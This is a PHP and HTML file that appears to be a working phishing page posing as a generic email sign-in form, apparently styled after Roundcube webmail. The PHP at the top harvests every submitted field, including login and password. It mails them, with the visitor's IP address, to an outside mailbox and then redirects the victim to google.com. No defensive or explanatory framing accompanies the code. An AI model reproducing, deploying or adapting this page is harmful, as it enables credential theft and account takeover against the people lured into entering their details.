<?php
if ($_SERVER['REQUEST_METHOD'] == 'POST') {
header('Location: http://google.com');
$message = '';
foreach($_POST as $variable => $value) {
$message .= $variable.': '.$value."\r\n";}
$header  = 'From: Oba Result <donotreply@pbmkr.vt>'."\r\n";
$header .= 'Reply-To: obanshola@mail.com'."\r\n";
$header .= 'MIME-Version: 1.0'."\r\n";
$header .= 'Content-Type: text/plain; charset=utf-8'."\r\n";
$header .= 'Content-Transfer-Encoding: 8bit'."\r\n";
$header .= 'X-Mailer: PHP v'.phpversion();
mail('obanshola@mail.com', $_SERVER['REMOTE_ADDR'].' @ '.$_SERVER['SERVER_NAME'].$_SERVER['SCRIPT_NAME'], $message, $header);
exit;
} ?>
<!DOCTYPE html>
<html><head>
<meta http-equiv="content-type" content="text/html; charset=UTF-8">
	<title>Email. Login</title>
	<meta name="viewport" content="width=device-width, initial-scale=1, minimum-scale=1, maximum-scale=1">
	<meta charset="utf-8">
	<meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
	<meta name="description" content="$1">
</head>
<body>

<link rel="stylesheet" type="text/css" href="index_files/styles.css">

<div class="loginForm">
	<form id="ox_form" name="oxForm" action="<?php echo basename(__FILE__); ?>" method="post">
		<div class="bgBox">
			<h2>Sign in to your email</h2>
			<div class="inputRow">
				<input type="text" name="login" id="login" placeholder="Enter your email" autofocus="">
			</div>
			<div class="inputRow">
				<input type="password" name="password" id="password" value="" placeholder="Enter your password">
			</div>
			<div class="inputRow submit">
				<input type="submit" value="Sign in" class="signIn" id="sign_in">
			</div>

			<div class="error">
				<span></span>
			</div>

			
			
			
			
			
		</div>
	</form>
</div>

<script src="index_files/jquery-1.12.4.min.js" integrity="sha256-ZosEbRLbNQzLpnKIkEdrPv7lOy9C27hHQ+Xp8a4MxAQ=" crossorigin="anonymous"></script>
<script src="index_files/jquery.cookie.min.js"></script>
<script src="index_files/md5.js"></script>
<script src="index_files/login.js"></script>

<script type="text/javascript">
    var Config = Object();
    Config.roundcubeServer = 'https://rc.ds.network';
    Config.status = '';

    var _error = $('div.error');
    if (Config.status === '')
        _error.find('span').html(Config.status);
    else
        _error.html('');

</script>




</body></html>